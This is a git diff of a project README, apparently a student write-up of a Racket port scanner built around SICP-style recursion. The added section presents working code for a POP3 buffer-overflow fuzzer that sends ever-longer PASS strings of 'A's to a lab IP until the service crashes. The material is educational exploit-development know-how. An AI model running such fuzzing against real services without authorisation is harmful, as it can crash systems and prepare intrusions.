@@ -59,7 +59,14 @@ When the user interacts with the program they pass the target IP of their scan a
 or a range of addresses within a /24 subnet mask (ie "192.168.1.1-254" ).
 A range of IPs will be mapped over using the for-each procedure (as described by SICP, for-each is map
 but without the list being returned, it is only evaluated for the side effects of the procedure) to detmerine
-if the machine is alive.
+if the machine is alive. 
+When called normally, ping will execute ad infinitum so we use the -c flag to limit to 3 pings. This way
+even if the network lost a ping for some reason it is unlikely we would drop all 3.
+We determine if the machine is alive by parsing the response code to our ping attempts looking for the numbers 64,
+which signifies a ping response.
+When we read a line indiciating a machine is alive we add the machine to a global list of dispatch procedures
+that acts as a stack by using set!
+
 
 ```racket
 (define (ips->machines targets ports protocols)
@@ -77,7 +84,10 @@ if the machine is alive.
 
 Because the connection attempts are threaded and our results will be non deterministic
 before matching the open ports to their services we recursively sort the port list returned by the
-machine's dispatch procedure
+machine's dispatch procedure.
+
+This is done by using a recursive function as the procedure argument for accumulate/foldr.
+As accumulate folds back it expects the list it is being handed to be sorted, then it will insert the element into the appropriate place.
 
 ```racket
 (define (sort-iter element port-list)
@@ -92,18 +102,32 @@ machine's dispatch procedure
 ```
 
 
-## 4. Filtering a List of File Objects for Only Those of Folder Type
+## 4. Using recursion to create a Fuzzer
 
-The ```list-all-children``` procedure creates a list of all objects contained within a given folder.
-These objects include the files themselves and other folders.
+Fuzzers are an essential tool in exploit development - buffer overflows in particular. In order to create
+a viable exploit we need to crash a system by overflowing a variable within the program by forcing a buffer
+larger than the program can handle. This can be done by creating increasinly large buffers and displaying their size
+as we send them over the network. When the system crashes our Fuzzer will stop and we will know the size 
+of a buffer that will crash the program
 
-The ```filter``` abstraction is then used with the ```folder?``` predicate to make a list of subfolders
-contained in a given folder:
-
+This can be easily accomplished using recursion :
+```racket
+(define-values (in out) (tcp-connect "192.168.1.13" 110))
+(define (fuzz n)
+        (if (displayln (read-line in))
+            (begin
+              (displayln "USER test" out)
+              (flush-output out)
+              (displayln n)
+              (displayln (string-append "PASS " (make-string n #\A)) out)
+              (flush-output out)
+              (displayln (read-line in))
+              (sleep 1)
+              (fuzz (+ n 100))) (displayln (string-append "Broke at " n))))
 ```
-(define (list-folders folder-id)
-  (filter folder? (list-all-children folder-id)))
-```
+
+This was a fuzzer that was specially made for a vulnerable service that requires we attempt a login to
+get access to the variable we want to overflow - hence the USER and PASS arguments that are passed across a network connection.
 
 ## 5. Recursive Descent on a Folder Hierarchy
 
